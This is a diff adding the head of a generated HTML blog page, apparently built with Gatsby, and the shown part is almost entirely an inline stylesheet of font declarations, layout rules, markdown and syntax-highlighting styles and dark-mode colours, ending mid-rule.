@@ -1,0 +1,699 @@
+<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.58c7447b9282ecfbd3c6.css" data-identity="gatsby-global-css">@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:100;src:local("Montserrat Thin "),local("Montserrat-Thin"),url(/static/montserrat-latin-100-8d7d79679b70dbe27172b6460e7a7910.woff2) format("woff2"),url(/static/montserrat-latin-100-ec38980a9e0119a379e2a9b3dbb1901a.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:100;src:local("Montserrat Thin italic"),local("Montserrat-Thinitalic"),url(/static/montserrat-latin-100italic-e279051046ba1286706adc886cf1c96b.woff2) format("woff2"),url(/static/montserrat-latin-100italic-3b325a3173c8207435cd1b76e19bf501.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:200;src:local("Montserrat Extra Light "),local("Montserrat-Extra Light"),url(/static/montserrat-latin-200-9d266fbbfa6cab7009bd56003b1eeb67.woff2) format("woff2"),url(/static/montserrat-latin-200-2d8ba08717110d27122e54c34b8a5798.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:200;src:local("Montserrat Extra Light italic"),local("Montserrat-Extra Lightitalic"),url(/static/montserrat-latin-200italic-6e5b3756583bb2263eb062eae992735e.woff2) format("woff2"),url(/static/montserrat-latin-200italic-a0d6f343e4b536c582926255367a57da.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:300;src:local("Montserrat Light "),local("Montserrat-Light"),url(/static/montserrat-latin-300-00b3e893aab5a8fd632d6342eb72551a.woff2) format("woff2"),url(/static/montserrat-latin-300-ea303695ceab35f17e7d062f30e0173b.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:300;src:local("Montserrat Light italic"),local("Montserrat-Lightitalic"),url(/static/montserrat-latin-300italic-56f34ea368f6aedf89583d444bbcb227.woff2) format("woff2"),url(/static/montserrat-latin-300italic-54b0bf2c8c4c12ffafd803be2466a790.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:400;src:local("Montserrat Regular "),local("Montserrat-Regular"),url(/static/montserrat-latin-400-b71748ae4f80ec8c014def4c5fa8688b.woff2) format("woff2"),url(/static/montserrat-latin-400-0659a9f4e90db5cf51b50d005bff1e41.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:400;src:local("Montserrat Regular italic"),local("Montserrat-Regularitalic"),url(/static/montserrat-latin-400italic-6eed6b4cbb809c6efc7aa7ddad6dbe3e.woff2) format("woff2"),url(/static/montserrat-latin-400italic-7583622cfde30ae49086d18447ab28e7.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:500;src:local("Montserrat Medium "),local("Montserrat-Medium"),url(/static/montserrat-latin-500-091b209546e16313fd4f4fc36090c757.woff2) format("woff2"),url(/static/montserrat-latin-500-edd311588712a96bbf435fad264fff62.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:500;src:local("Montserrat Medium italic"),local("Montserrat-Mediumitalic"),url(/static/montserrat-latin-500italic-c90ced68b46050061d1a41842d6dfb43.woff2) format("woff2"),url(/static/montserrat-latin-500italic-5146cbfe02b1deea5dffea27a5f2f998.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:600;src:local("Montserrat SemiBold "),local("Montserrat-SemiBold"),url(/static/montserrat-latin-600-0480d2f8a71f38db8633b84d8722e0c2.woff2) format("woff2"),url(/static/montserrat-latin-600-b77863a375260a05dd13f86a1cee598f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:600;src:local("Montserrat SemiBold italic"),local("Montserrat-SemiBolditalic"),url(/static/montserrat-latin-600italic-cf46ffb11f3a60d7df0567f8851a1d00.woff2) format("woff2"),url(/static/montserrat-latin-600italic-c4fcfeeb057724724097167e57bd7801.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:700;src:local("Montserrat Bold "),local("Montserrat-Bold"),url(/static/montserrat-latin-700-7dbcc8a5ea2289d83f657c25b4be6193.woff2) format("woff2"),url(/static/montserrat-latin-700-99271a835e1cae8c76ef8bba99a8cc4e.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:700;src:local("Montserrat Bold italic"),local("Montserrat-Bolditalic"),url(/static/montserrat-latin-700italic-c41ad6bdb4bd504a843d546d0a47958d.woff2) format("woff2"),url(/static/montserrat-latin-700italic-6779372f04095051c62ed36bc1dcc142.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:800;src:local("Montserrat ExtraBold "),local("Montserrat-ExtraBold"),url(/static/montserrat-latin-800-db9a3e0ba7eaea32e5f55328ace6cf23.woff2) format("woff2"),url(/static/montserrat-latin-800-4e3c615967a2360f5db87d2f0fd2456f.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:800;src:local("Montserrat ExtraBold italic"),local("Montserrat-ExtraBolditalic"),url(/static/montserrat-latin-800italic-bf45bfa14805969eda318973947bc42b.woff2) format("woff2"),url(/static/montserrat-latin-800italic-fe82abb0bcede51bf724254878e0c374.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:normal;font-weight:900;src:local("Montserrat Black "),local("Montserrat-Black"),url(/static/montserrat-latin-900-e66c7edc609e24bacbb705175669d814.woff2) format("woff2"),url(/static/montserrat-latin-900-8211f418baeb8ec880b80ba3c682f957.woff) format("woff")}@font-face{font-display:swap;font-family:Montserrat;font-style:italic;font-weight:900;src:local("Montserrat Black italic"),local("Montserrat-Blackitalic"),url(/static/montserrat-latin-900italic-4454c775e48152c1a72510ceed3603e2.woff2) format("woff2"),url(/static/montserrat-latin-900italic-efcaa0f6a82ee0640b83a0916e6e8d68.woff) format("woff")}.search-input-wrapper{align-items:center;display:none;margin-top:3px;width:180px}@media(min-width:768px){.search-input-wrapper{display:flex}}.search-icon{color:var(--primary-text-color);margin-right:2px}.search-input{height:100%;width:100%}.search-input .MuiAutocomplete-inputRoot{padding-right:0!important}.search-input .MuiInputBase-input{color:var(--primary-text-color)!important;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;padding-bottom:2px!important}.search-input .MuiInput-underline:before{border-bottom-width:1px}.search-input .MuiInput-underline:after,.search-input .MuiInput-underline:before{border-bottom-color:var(--primary-text-color)}.page-header-wrapper{display:flex;height:60px;justify-content:center;width:100%}.page-header-wrapper .page-header{align-items:center;display:flex;justify-content:space-between;max-width:720px;width:100%}.page-header-wrapper .page-header .link{color:var(--primary-text-color);font-size:17px;font-weight:700}@media(min-width:768px){.page-header-wrapper .page-header .link{font-size:20px;font-weight:700}}.page-header-wrapper .page-header .trailing-section{align-items:center;display:flex}.page-header-wrapper .page-header .trailing-section .link{margin-right:10px}@media(min-width:768px){.page-header-wrapper .page-header .trailing-section .link{margin-right:20px}}.page-footer-wrapper{align-items:center;display:flex;height:62px;justify-content:center;margin-top:auto;width:100%}.page-footer-wrapper .page-footer{max-width:720px;text-align:center;width:100%}.page-footer-wrapper .page-footer .link{color:var(--primary-text-color);font-size:20px;font-weight:700;margin-right:20px}.page-footer-wrapper .page-footer a{color:#3a95ff}.dark-mode-button-wrapper{align-items:center;bottom:20px;display:flex;justify-content:center;position:fixed;right:20px}.dark-mode-button{-webkit-backdrop-filter:blur(30px);backdrop-filter:blur(30px);background-color:#363f47!important;border-radius:50px;box-shadow:0 5px 25px rgba(0,0,0,.12);cursor:pointer;height:50px;width:50px;z-index:3}.dark-mode-icon{color:#fff}a,abbr,acronym,address,applet,article,aside,audio,b,big,blockquote,body,canvas,caption,center,cite,code,dd,del,details,dfn,div,dl,dt,em,embed,fieldset,figcaption,figure,footer,form,h1,h2,h3,h4,h5,h6,header,hgroup,html,i,iframe,img,ins,kbd,label,legend,li,mark,menu,nav,object,ol,output,p,pre,q,ruby,s,samp,section,small,span,strike,strong,sub,summary,sup,table,tbody,td,tfoot,th,thead,time,tr,tt,u,ul,var,video{border:0;font-size:100%;font:inherit;margin:0;padding:0;vertical-align:baseline}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}body{line-height:1}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:"";content:none}table{border-collapse:collapse;border-spacing:0}a{outline:none;text-decoration:none}html{--background-color:#fff;--primary-text-color:#000;--secondary-text-color:#9e9e9e;--content-text-color:#37352f;--button-background-color:#f3f3f4;--button-text-color:#363f47;--tab-text-color:#6e6d7a;--tab-hover-text-color:#0d0c22;--tab-selected-background-color:rgba(13,12,34,.05);--bio-link-icon-color:rgba(0,0,0,.54);--about-link-icon-color:#a8a8a8;--chip-background-color:#f3f3f4;--link-text-color:rgba(55,53,47,.7);--post-card-border-color:rgba(0,0,0,.12);--markdown-table-even-cell-background-color:#f6f8fa;--markdown-table-border-color:#dfe2e5;--markdown-blockquote-border-color:#dfe2e5;--markdown-border-color:#e1e4e8}html[data-theme=dark]{--background-color:#232326;--primary-text-color:#e6e6e6;--secondary-text-color:#768390;--content-text-color:#e6e6e6;--button-background-color:#444c56;--button-text-color:#363f47;--tab-text-color:#768390;--tab-hover-text-color:#acbac7;--tab-selected-background-color:#373e47;--chip-background-color:#323a42;--bio-link-icon-color:#e6e6e6;--about-link-icon-color:#a8a8a8;--link-text-color:#90b0ec;--post-card-border-color:#363f47;--markdown-table-even-cell-background-color:#2d333b;--markdown-table-border-color:#444c56;--markdown-blockquote-border-color:#4f5864;--markdown-border-color:#e1e4e8}*{-webkit-appearance:none;appearance:none;box-sizing:border-box}html{font-size:14px;height:100%;overflow-y:scroll;width:100%}body{background-color:var(--background-color)!important}a{color:var(--link-text-color)}.page-wrapper{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;color:var(--primary-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;justify-content:center;min-height:100vh;padding-left:15px;padding-right:15px;word-break:keep-all}.page-wrapper,.page-wrapper .page-content{align-items:center;display:flex;flex-direction:column;width:100%}.page-wrapper .page-content{max-width:720px}.icon{color:var(--about-link-icon-color);font-size:20px}.social-links .icon{color:var(--bio-link-icon-color);font-size:30px}@keyframes blinking-cursor{0%{opacity:0}50%{opacity:1}to{opacity:0}}.bio{color:var(--primary-text-color);display:flex;flex-direction:column;justify-content:space-between;margin-bottom:120px;margin-top:120px;width:100%}@media(min-width:768px){.bio{align-items:center;flex-direction:row}}.bio .introduction{display:flex;flex-direction:column;word-break:keep-all}.bio .introduction .react-rotating-text-cursor{animation:blinking-cursor .8s cubic-bezier(.68,.01,.01,.99) 0s infinite}.bio .introduction strong{display:inline-block;font-weight:600}.bio .introduction.korean{font-size:32px;font-weight:100;line-height:1.2}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:35px;line-height:35px}@media(min-width:768px){.bio .introduction.korean{font-size:40px}.bio .introduction.korean .title .react-rotating-text-cursor{font-size:45px;line-height:45px}}.bio .introduction.english{font-family:montserrat;font-size:25px;line-height:1.2}@media(min-width:768px){.bio .introduction.english{font-size:45px}}.bio .introduction.english .name{font-size:35px;font-weight:600}.bio .introduction.english .job{font-size:35px}.bio .introduction.english .description{font-size:20px;font-weight:200;margin-top:8px}.bio .introduction.english .social-links{display:flex;margin-top:20px}.bio .thumbnail{display:none;width:250px}@media(min-width:768px){.bio .thumbnail{display:block}}.section-header-wrapper{display:flex;justify-content:center;margin-bottom:32px;width:100%}.section-header-wrapper .section-header{border-bottom:4px solid var(--primary-text-color);color:var(--primary-text-color);font-size:30px;font-weight:700;padding-bottom:5px}.timestamp-section{align-items:center;display:flex;flex-direction:column;justify-content:center;margin-bottom:50px;width:100%;word-break:keep-all}.timestamp-section .body{padding:0 10px;width:100%}.timestamp-section .body .timestamp{border-left:2px solid #bdbdbd;display:flex;font-size:18px;font-weight:400;justify-items:center;margin-left:5px;padding:10px 0;width:100%}.timestamp-section .body .timestamp:first-child{padding-top:7px}.timestamp-section .body .timestamp:last-child{padding-bottom:7px}.timestamp-section .body .timestamp:before{align-self:center;background-color:var(--background-color);border:2px solid #828282;border-radius:10px;content:"";height:10px;left:-1px;position:relative;transform:translatex(-50%);width:10px}.timestamp-section .body .timestamp .date{align-self:center;color:#828282;margin-left:5px;margin-right:5px;min-width:115px;width:115px}@media(min-width:768px){.timestamp-section .body .timestamp .date{min-width:200px;width:200px}}.timestamp-section .body .timestamp .activity{line-height:23px;width:100%}.project-section{align-items:center;justify-content:center}.project-section,.project-section .project{display:flex;flex-direction:column;width:100%}.project-section .project{margin-bottom:30px;padding:15px}.project-section .project .head{font-size:20px;font-weight:700;line-height:30px;margin-bottom:10px}.project-section .project .body{display:flex;flex-direction:column;width:100%}.project-section .project .body .thumbnail{margin-bottom:10px;width:100%}.project-section .project .body .tech-stack{display:flex;margin-bottom:10px}.project-section .project .body .tech-stack .tech{background-color:var(--chip-background-color);border-radius:10px;font-size:15px;font-weight:500;margin-right:5px;padding:5px 7px}.project-section .project .body .description{font-size:16px;font-weight:400;line-height:1.4}@media(min-width:768px){.project-section .project .body{flex-direction:column}.project-section .project .body .content{margin-top:0}}.post-header{border-bottom:1px solid var(--post-card-border-color);display:flex;flex-direction:column;justify-content:center;margin-bottom:40px;margin-top:20px;padding-bottom:10px;width:100%;word-break:keep-all}.post-header .emoji{font-size:78px;margin-bottom:20px}.post-header .categories{margin-bottom:5px}.post-header .categories .category{color:var(--primary-text-color);font-weight:600;margin-right:4px}.post-header .categories .category:hover{text-decoration:underline}.post-header .title{color:var(--primary-text-color);font-size:32px;font-weight:600;line-height:1.3;margin-bottom:6px}.post-header .info{color:var(--secondary-text-color);display:flex;flex-wrap:wrap;font-size:16px;font-weight:500;line-height:1.5;width:100%}.post-header .info .author{margin-right:4px}.post-header .info strong{color:var(--primary-text-color);font-weight:600}.post-navigator{column-gap:1.4%;display:grid;grid-template-columns:49.3% 49.3%;width:100%}.post-navigator .post-card{border:1px solid var(--post-card-border-color);border-radius:6px;color:var(--primary-text-color);cursor:pointer;display:flex;flex-direction:column;padding:15px;transition:transform .2s;width:100%}.post-navigator .post-card:hover .title{text-decoration:underline}.post-navigator .post-card.prev{margin-right:auto}.post-navigator .post-card.next{margin-left:auto}.post-navigator .post-card .direction{color:gray;font-size:14px;font-weight:500;margin-bottom:5px}.post-navigator .post-card .title{font-size:16px;font-weight:600;line-height:1.4;margin-bottom:7px}.markdown .octicon{fill:currentColor;display:inline-block;vertical-align:text-bottom}.markdown .anchor{float:left;line-height:1;margin-left:-20px;padding-right:4px}.markdown .anchor:focus{outline:none}.markdown h1 .octicon-link,.markdown h2 .octicon-link,.markdown h3 .octicon-link,.markdown h4 .octicon-link,.markdown h5 .octicon-link,.markdown h6 .octicon-link{color:#1b1f23;vertical-align:middle;visibility:hidden}.markdown h1:hover .anchor,.markdown h2:hover .anchor,.markdown h3:hover .anchor,.markdown h4:hover .anchor,.markdown h5:hover .anchor,.markdown h6:hover .anchor{text-decoration:none}.markdown h1:hover .anchor .octicon-link,.markdown h2:hover .anchor .octicon-link,.markdown h3:hover .anchor .octicon-link,.markdown h4:hover .anchor .octicon-link,.markdown h5:hover .anchor .octicon-link,.markdown h6:hover .anchor .octicon-link{visibility:visible}.markdown h1:hover .anchor .octicon-link:before,.markdown h2:hover .anchor .octicon-link:before,.markdown h3:hover .anchor .octicon-link:before,.markdown h4:hover .anchor .octicon-link:before,.markdown h5:hover .anchor .octicon-link:before,.markdown h6:hover .anchor .octicon-link:before{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' aria-hidden='true' viewBox='0 0 16 16'%3E%3Cpath fill-rule='evenodd' d='M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z'/%3E%3C/svg%3E");content:" ";display:inline-block;height:16px;width:16px}.markdown{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;word-wrap:break-word;color:var(--content-text-color);font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;font-weight:500;line-height:1.5}.markdown details{display:block}.markdown summary{display:list-item}.markdown a{background-color:initial}.markdown a:active,.markdown a:hover{outline-width:0}.markdown strong{font-weight:inherit;font-weight:bolder}.markdown h1{margin:.67em 0}.markdown img{border-style:none}.markdown code,.markdown kbd,.markdown pre{font-family:monospace,monospace;font-size:1em}.markdown hr{box-sizing:initial;overflow:visible}.markdown input{font:inherit;margin:0;overflow:visible}.markdown [type=checkbox]{box-sizing:border-box;padding:0}.markdown *{box-sizing:border-box}.markdown input{font-family:inherit;font-size:inherit;line-height:inherit}.markdown a{border-bottom:.05em solid;border-bottom-color:var(--link-text-color);border-left-color:var(--link-text-color);border-right-color:var(--link-text-color);border-top-color:var(--link-text-color);color:var(--link-text-color);text-decoration:none}.markdown a.anchor{border-bottom:none}.markdown strong{font-weight:700}.markdown hr{background:transparent;border-bottom:1px solid var(--markdown-blockquote-border-color);height:0;margin:15px 0;overflow:hidden}.markdown hr:after,.markdown hr:before{content:"";display:table}.markdown hr:after{clear:both}.markdown table{border-collapse:collapse;border-spacing:0}.markdown td,.markdown th{padding:0}.markdown details summary{cursor:pointer}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{margin-bottom:0;margin-top:0}.markdown h1{font-size:32px}.markdown h1,.markdown h2{font-weight:600}.markdown h2{font-size:24px}.markdown h3{font-size:20px}.markdown h3,.markdown h4{font-weight:600}.markdown h4{font-size:16px}.markdown h5{font-size:14px}.markdown h5,.markdown h6{font-weight:600}.markdown h6{font-size:12px}.markdown p{margin-bottom:10px;margin-top:0}.markdown blockquote{margin:0}.markdown ol,.markdown ul{margin-bottom:0;margin-top:0;padding-left:0}.markdown ol ol,.markdown ul ol{list-style-type:lower-roman}.markdown ol ol ol,.markdown ol ul ol,.markdown ul ol ol,.markdown ul ul ol{list-style-type:lower-alpha}.markdown dd{margin-left:0}.markdown code,.markdown pre{font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px}.markdown code.language-text{border-radius:3px;font-size:85%;padding:.2em .4em}.markdown :not(pre)>code.language-text{background:hsla(44,6%,50%,.15);color:#eb5757;overflow-wrap:break-word}.markdown pre{margin-bottom:0;margin-top:0}.markdown input::-webkit-inner-spin-button,.markdown input::-webkit-outer-spin-button{-webkit-appearance:none;appearance:none;margin:0}.markdown :checked+.radio-label{border-color:#0366d6;position:relative;z-index:1}.markdown .border{border:1px solid var(--markdown-border-color)!important}.markdown .border-0{border:0!important}.markdown .border-bottom{border-bottom:1px solid var(--markdown-border-color)!important}.markdown .rounded-1{border-radius:3px!important}.markdown .bg-white{background-color:transparent!important}.markdown .bg-gray-light{background-color:#fafbfc!important}.markdown .text-gray-light{color:#6a737d!important}.markdown .pl-3,.markdown .px-3{padding-left:16px!important}.markdown .px-3{padding-right:16px!important}.markdown .f6{font-size:12px!important}.markdown .lh-condensed{line-height:1.25!important}.markdown .text-bold{font-weight:600!important}.markdown .pl-c{color:#6a737d}.markdown .pl-c1,.markdown .pl-s .pl-v{color:#005cc5}.markdown .pl-e,.markdown .pl-en{color:#6f42c1}.markdown .pl-s .pl-s1,.markdown .pl-smi{color:#24292e}.markdown .pl-ent{color:#22863a}.markdown .pl-k{color:#d73a49}.markdown .pl-pds,.markdown .pl-s,.markdown .pl-s .pl-pse .pl-s1,.markdown .pl-sr,.markdown .pl-sr .pl-cce,.markdown .pl-sr .pl-sra,.markdown .pl-sr .pl-sre{color:#032f62}.markdown .pl-smw,.markdown .pl-v{color:#e36209}.markdown .pl-bu{color:#b31d28}.markdown .pl-ii{background-color:#b31d28;color:#fafbfc}.markdown .pl-c2{background-color:#d73a49;color:#fafbfc}.markdown .pl-c2:before{content:"^M"}.markdown .pl-sr .pl-cce{color:#22863a;font-weight:700}.markdown .pl-ml{color:#735c0f}.markdown .pl-mh,.markdown .pl-mh .pl-en,.markdown .pl-ms{color:#005cc5;font-weight:700}.markdown .pl-mi{color:#24292e;font-style:italic}.markdown .pl-mb{color:#24292e;font-weight:700}.markdown .pl-md{background-color:#ffeef0;color:#b31d28}.markdown .pl-mi1{background-color:#f0fff4;color:#22863a}.markdown .pl-mc{background-color:#ffebda;color:#e36209}.markdown .pl-mi2{background-color:#005cc5;color:#f6f8fa}.markdown .pl-mdr{color:#6f42c1;font-weight:700}.markdown .pl-ba{color:#586069}.markdown .pl-sg{color:#959da5}.markdown .pl-corl{color:#032f62;text-decoration:underline}.markdown .mb-0{margin-bottom:0!important}.markdown .my-2{margin-bottom:8px!important;margin-top:8px!important}.markdown .pl-0{padding-left:0!important}.markdown .py-0{padding-bottom:0!important;padding-top:0!important}.markdown .pl-1{padding-left:4px!important}.markdown .pl-2{padding-left:8px!important}.markdown .py-2{padding-bottom:8px!important;padding-top:8px!important}.markdown .pl-3{padding-left:16px!important}.markdown .pl-4{padding-left:24px!important}.markdown .pl-5{padding-left:32px!important}.markdown .pl-6{padding-left:40px!important}.markdown .pl-7{padding-left:48px!important}.markdown .pl-8{padding-left:64px!important}.markdown .pl-9{padding-left:80px!important}.markdown .pl-10{padding-left:96px!important}.markdown .pl-11{padding-left:112px!important}.markdown .pl-12{padding-left:128px!important}.markdown hr{border-bottom-color:#eee}.markdown kbd{background-color:#fafbfc;border:1px solid #d1d5da;border-radius:3px;box-shadow:inset 0 -1px 0 #d1d5da;color:#444d56;display:inline-block;font:11px SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;line-height:10px;padding:3px 5px;vertical-align:middle}.markdown:after,.markdown:before{content:"";display:table}.markdown:after{clear:both}.markdown>:first-child{margin-top:0!important}.markdown>:last-child{margin-bottom:0!important}.markdown a:not([href]){color:inherit;text-decoration:none}.markdown blockquote,.markdown details,.markdown dl,.markdown ol,.markdown p,.markdown pre,.markdown table,.markdown ul{margin-bottom:16px;margin-top:0}.markdown hr{background-color:var(--markdown-border-color);border:0;height:.25em;margin:24px 0;padding:0}.markdown blockquote{border-left:.25em solid var(--markdown-blockquote-border-color);color:#6a737d;padding:0 1em}.markdown blockquote>:first-child{margin-top:0}.markdown blockquote>:last-child{margin-bottom:0}.markdown h1,.markdown h2,.markdown h3,.markdown h4,.markdown h5,.markdown h6{font-weight:600;line-height:1.25;margin-bottom:16px;margin-top:24px}.markdown h1{font-size:2em}.markdown h2{font-size:1.5em}.markdown h3{font-size:1.25em}.markdown h4{font-size:1em}.markdown h5{font-size:.875em}.markdown h6{color:#6a737d;font-size:.85em}.markdown ol,.markdown ul{padding-left:2em}.markdown ol ol,.markdown ol ul,.markdown ul ol,.markdown ul ul{margin-bottom:0;margin-top:0}.markdown ol{list-style-type:decimal}.markdown ul{list-style-type:disc}.markdown li{word-wrap:break-all;display:list-item;text-align:-webkit-match-parent}.markdown li>p{margin-top:16px}.markdown li+li{margin-top:.25em}.markdown dl{padding:0}.markdown dl dt{font-size:1em;font-style:italic;font-weight:600;margin-top:16px;padding:0}.markdown dl dd{margin-bottom:16px;padding:0 16px}.markdown table{display:block;overflow:auto;width:100%}.markdown table th{font-weight:600}.markdown table td,.markdown table th{border:1px solid var(--markdown-table-border-color);padding:6px 13px}.markdown table tr{border-top:1px solid var(--markdown-table-border-color)}.markdown table tr:nth-child(2n){background-color:var(--markdown-table-even-cell-background-color)}.markdown img{background-color:transparent;box-sizing:initial;display:block;margin:0 auto;max-width:100%}.markdown img[align=right]{padding-left:20px}.markdown img[align=left]{padding-right:20px}.markdown code{background-color:rgba(27,31,35,.05);border-radius:3px;font-size:85%;margin:0;padding:.2em .4em}.markdown pre{word-wrap:normal}.markdown pre>code{background:transparent;border:0;font-size:100%;margin:0;padding:0;white-space:pre;word-break:normal}.markdown .highlight{margin-bottom:16px}.markdown .highlight pre{margin-bottom:0;word-break:normal}.markdown .highlight pre,.markdown pre{background-color:#f6f8fa;border-radius:3px;font-size:85%;line-height:1.45;overflow:auto;padding:16px}.markdown pre code{word-wrap:normal;background-color:initial;border:0;display:inline;line-height:inherit;margin:0;max-width:auto;overflow:visible;padding:0}.markdown .commit-tease-sha{color:#444d56;display:inline-block;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:90%}.markdown .full-commit .btn-outline:not(:disabled):hover{border-color:#005cc5;color:#005cc5}.markdown .blob-wrapper{overflow-x:auto;overflow-y:hidden}.markdown .blob-wrapper-embedded{max-height:240px;overflow-y:auto}.markdown .blob-num{color:rgba(27,31,35,.3);cursor:pointer;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;line-height:20px;min-width:50px;padding-left:10px;padding-right:10px;text-align:right;-webkit-user-select:none;-ms-user-select:none;user-select:none;vertical-align:top;white-space:nowrap;width:1%}.markdown .blob-num:hover{color:rgba(27,31,35,.6)}.markdown .blob-num:before{content:attr(data-line-number)}.markdown .blob-code{line-height:20px;padding-left:10px;padding-right:10px;position:relative;vertical-align:top}.markdown .blob-code-inner{word-wrap:normal;color:#24292e;font-family:SFMono-Regular,Consolas,Liberation Mono,Menlo,monospace;font-size:12px;overflow:visible;white-space:pre}.markdown .pl-token.active,.markdown .pl-token:hover{background:#ffea7f;cursor:pointer}.markdown .tab-size[data-tab-size="1"]{-moz-tab-size:1;-o-tab-size:1;tab-size:1}.markdown .tab-size[data-tab-size="2"]{-moz-tab-size:2;-o-tab-size:2;tab-size:2}.markdown .tab-size[data-tab-size="3"]{-moz-tab-size:3;-o-tab-size:3;tab-size:3}.markdown .tab-size[data-tab-size="4"]{-moz-tab-size:4;-o-tab-size:4;tab-size:4}.markdown .tab-size[data-tab-size="5"]{-moz-tab-size:5;-o-tab-size:5;tab-size:5}.markdown .tab-size[data-tab-size="6"]{-moz-tab-size:6;-o-tab-size:6;tab-size:6}.markdown .tab-size[data-tab-size="7"]{-moz-tab-size:7;-o-tab-size:7;tab-size:7}.markdown .tab-size[data-tab-size="8"]{-moz-tab-size:8;-o-tab-size:8;tab-size:8}.markdown .tab-size[data-tab-size="9"]{-moz-tab-size:9;-o-tab-size:9;tab-size:9}.markdown .tab-size[data-tab-size="10"]{-moz-tab-size:10;-o-tab-size:10;tab-size:10}.markdown .tab-size[data-tab-size="11"]{-moz-tab-size:11;-o-tab-size:11;tab-size:11}.markdown .tab-size[data-tab-size="12"]{-moz-tab-size:12;-o-tab-size:12;tab-size:12}.markdown .task-list-item{list-style-type:none}.markdown .task-list-item+.task-list-item{margin-top:3px}.markdown .task-list-item input{margin:0 .2em .25em -1.6em;vertical-align:middle}.markdown .table-of-contents{align-items:flex-start;display:flex;flex-direction:column;justify-content:center;position:fixed;right:0;top:75px;width:340px}@media(max-width:1300px){.markdown .table-of-contents{display:none}}.markdown .table-of-contents ul{cursor:pointer;list-style-type:none}.markdown .table-of-contents ul li a{border-bottom:none;color:var(--secondary-text-color);font-size:14px;height:30px;padding:6px 2px;width:100%}.markdown .table-of-contents ul p{margin:0}.markdown .gatsby-resp-image-wrapper{display:flex!important;justify-content:center!important;max-height:560px!important;width:100%!important}.markdown .gatsby-resp-image-wrapper img{height:auto!important;max-height:560px!important;max-width:100%!important;position:relative!important;width:auto!important}.markdown .gatsby-resp-image-wrapper+em{color:#6a737d;display:block;font-size:15px;font-style:italic;text-align:center}code[class*=language-],pre[class*=language-]{word-wrap:normal;background:none;color:#ccc;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;text-align:left;white-space:pre;word-break:normal;word-spacing:normal}pre[class*=language-]{margin:.5em 0;overflow:auto;padding:1em}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{border-radius:.3em;padding:.1em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.post-content{margin-bottom:20px;width:100%}.category-page-header-wrapper,.post-content{display:flex;flex-direction:column;justify-content:center}.category-page-header-wrapper{align-items:center;margin-bottom:30px;margin-top:30px}.category-page-header-wrapper .category-page-title{border-bottom:3px solid 